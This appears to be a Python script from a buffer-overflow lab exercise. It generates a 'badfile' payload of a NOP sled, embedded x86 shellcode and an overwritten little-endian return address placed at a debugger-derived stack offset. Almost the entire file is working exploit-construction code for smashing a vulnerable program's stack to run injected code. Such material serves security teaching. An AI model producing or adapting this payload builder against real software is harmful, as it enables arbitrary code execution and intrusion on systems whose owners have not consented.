#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc0\x31\xc9\xb0\x44\xb5\x03\x50\x51\x31\xc0\xb0\x06\x50\xbb"
   "\x5d\x63\x55\x56\xff\xd3"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(580))


########################################################################
# Put the shellcode somewhere in the payload
start = 192			# Change this number
content[start: start+ len(shellcode)] = shellcode


# Decide the return address value
# and put it somewhere in the payload

# The first number is the value of ebp found from debugger
# The second one is to compensate for the space
# taken up during debugging
ret = 0xffffcf4f + 0x100		# Change this number

# offset generated by taking the difference between $ebp and &buffer
# and adding 4 (for 32 bit) to it
offset = 525

L = 4		# Use 4 for 32-bit address and 8 for 64-bit address

content[offset : offset+L] = (ret).to_bytes(L, byteorder="little")
content[offset+L: offset+L*2] = (46).to_bytes(L, byteorder="little")
##########################################################################

# Write the content to a file
with open("badfile", "wb") as file:
	file.write(content)

print("Written content to badfile")


